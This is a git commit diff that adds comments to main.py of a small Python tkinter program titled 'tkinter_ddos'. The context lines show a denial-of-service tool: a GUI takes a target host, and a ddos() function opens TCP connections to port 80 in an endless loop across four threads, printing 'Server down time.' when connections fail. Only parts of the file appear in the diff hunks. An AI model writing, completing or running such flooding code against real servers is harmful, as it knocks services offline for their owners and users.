a623a92703f31512efb4f35016dca357461739ad
gitn3xus <gitn3xus@users.noreply.github.com>
2019-02-06 13:52:59 +0100

    Added comments

--- main.py
+++ main.py
@@ -1,16 +1,19 @@
 import socket
 from threading import Thread
 from tkinter import *
+#fuction for the settings
 def settings():
     def button():
         it_works = Label(win, text="It works")
         it_works.pack()
+    #mainloop for the settings
     win = Tk()
     win.minsize(width=400, height=300)
     win.title("tkinter_ddos/settings")
     button_test = Button(win, text="test", command=button)
     button_test.pack()
     win.mainloop()
+#host and port input
 def form():
     host = input_host.get()
     global target
@@ -18,6 +21,7 @@ def form():
     global port
     port = 80
     #print(target, port)
+#main funcion that does all the magic
 def ddos():
     while True:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mysocket:
@@ -31,10 +35,12 @@ def ddos():
             except socket.error:
                 print("Server down time.")
         mysocket.close()
+#thread thing
 def start():
     for i in range(4):
         t = Thread(target=ddos)
         t.start()
+#mainloop for the gui
 window = Tk()
 window.title("tkinter_ddos")
 window.minsize(width=400, height=300)
